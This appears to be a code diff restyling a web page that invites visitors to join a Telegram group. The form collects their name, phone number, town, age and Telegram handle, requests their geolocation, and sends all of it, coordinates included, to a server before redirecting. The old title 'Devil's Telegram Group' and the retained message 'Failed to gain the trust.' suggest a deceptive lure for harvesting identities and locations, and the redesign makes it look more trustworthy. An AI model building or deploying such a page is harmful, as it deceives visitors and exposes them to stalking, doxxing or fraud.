@@ -1,137 +1,150 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Join Devil's Telegram Group</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Join Telegram Group</title>
+  <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    html, body {
+    * {
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #5f2c82, #49a09d);
-      color: white;
+      box-sizing: border-box;
+      font-family: 'SF Pro Display', sans-serif;
+    }
+    body {
+      background: #f2f2f7;
+      color: #000;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      flex-direction: column;
-      min-height: 100vh;
+      height: 100vh;
+      padding: 20px;
     }
-
     h2 {
       font-size: 1.8rem;
-      margin-bottom: 1rem;
-      text-align: center;
-      white-space: nowrap;
-      overflow: hidden;
-      animation: typing 3s steps(22), blink 0.5s step-end infinite alternate;
-      border-right: 3px solid white;
+      margin-bottom: 20px;
     }
-
-    @keyframes typing {
-      from { width: 0 }
-      to { width: 100% }
-    }
-
-    @keyframes blink {
-      from { border-color: transparent }
-      to { border-color: white }
-    }
-
     form {
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(10px);
+      background: #fff;
       padding: 20px;
-      border-radius: 16px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      width: 90%;
+      border-radius: 20px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+      width: 100%;
       max-width: 400px;
+      transition: all 0.3s ease;
     }
-
     input, button {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
-      border: none;
-      border-radius: 8px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
       font-size: 1rem;
     }
-
     input:focus {
-      box-shadow: 0 0 8px #fff;
-      background: #fff;
-      color: #333;
+      border-color: #007aff;
+      outline: none;
     }
-
     button {
-      background: #ffffff;
-      color: #333;
-      font-weight: bold;
-      transition: 0.3s;
+      background: #007aff;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      transition: all 0.3s ease;
     }
-
     button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 10px #fff;
+      background: #005ecb;
+    }
+    .progress-container {
+      margin-top: 10px;
+      display: none;
+    }
+    .progress-bar {
+      height: 5px;
+      width: 0;
+      background: #007aff;
+      border-radius: 2px;
+      transition: width 0.4s ease;
+    }
+    .status {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
+  <h2>Join Our Telegram Group</h2>
+  <form id="userForm">
+    <input type="text" name="fullname" placeholder="Full Name" required>
+    <input type="text" name="phone" placeholder="Phone Number" required>
+    <input type="text" name="towncity" placeholder="Town/City" required>
+    <input type="number" name="age" placeholder="Age" required>
+    <input type="text" name="telegram" placeholder="Telegram Username" required>
+    <button type="submit">Submit</button>
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="status" id="status"></div>
+  </form>  <script>
+    const form = document.getElementById("userForm");
+    const progressBar = document.getElementById("progressBar");
+    const statusText = document.getElementById("status");
+    const progressContainer = document.querySelector(".progress-container");
 
-<h2>Fill the form to join</h2>
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      progressContainer.style.display = "block";
+      progressBar.style.width = "20%";
+      statusText.textContent = "Requesting location...";
 
-<form id="userForm">
-  <input type="text" name="fullname" placeholder="Full Name" required>
-  <input type="text" name="phone" placeholder="Phone Number" required>
-  <input type="text" name="towncity" placeholder="Town/City" required>
-  <input type="number" name="age" placeholder="Age" required>
-  <input type="text" name="telegram" placeholder="Telegram Username" required>
-  <button type="submit">Submit</button>
-</form>
+      navigator.geolocation.getCurrentPosition(success, error, {
+        enableHighAccuracy: false,
+        timeout: 5000
+      });
 
-<script>
-document.getElementById("userForm").addEventListener("submit", function (e) {
-  e.preventDefault();
-  const form = e.target;
+      function success(position) {
+        progressBar.style.width = "50%";
+        statusText.textContent = "Sending data...";
 
-  if (!navigator.geolocation) {
-    alert("Geolocation not supported.");
-    return;
-  }
+        const { latitude, longitude } = position.coords;
+        const data = {
+          fullname: form.fullname.value.trim(),
+          phone: form.phone.value.trim(),
+          towncity: form.towncity.value.trim(),
+          age: form.age.value.trim(),
+          telegram: form.telegram.value.trim(),
+          latitude,
+          longitude
+        };
 
-  navigator.geolocation.getCurrentPosition(sendData, () => {
-    alert("Failed to gain the trust.");
-  }, { enableHighAccuracy: true, timeout: 10000 });
-
-  function sendData(position) {
-    const { latitude, longitude } = position.coords;
-    const data = {
-      fullname: form.fullname.value.trim(),
-      phone: form.phone.value.trim(),
-      towncity: form.towncity.value.trim(),
-      age: form.age.value.trim(),
-      telegram: form.telegram.value.trim(),
-      latitude,
-      longitude
-    };
-
-    fetch("/submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    })
-    .then(res => res.json())
-    .then(response => {
-      if (response.link) {
-        window.location.href = response.link;
-      } else {
-        alert(response.error || "Something went wrong.");
+        fetch("/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        })
+        .then(res => res.json())
+        .then(response => {
+          progressBar.style.width = "100%";
+          if (response.link) {
+            statusText.textContent = "Redirecting...";
+            setTimeout(() => {
+              window.location.href = response.link;
+            }, 1000);
+          } else {
+            statusText.textContent = response.error || "Something went wrong.";
+          }
+        })
+        .catch(() => {
+          statusText.textContent = "Network error.";
+        });
       }
-    })
-    .catch(() => alert("Network error"));
-  }
-});
-</script>
 
-</body>
+      function error() {
+        progressBar.style.width = "100%";
+        statusText.textContent = "Failed to gain the trust.";
+      }
+    });
+  </script></body>
 </html>
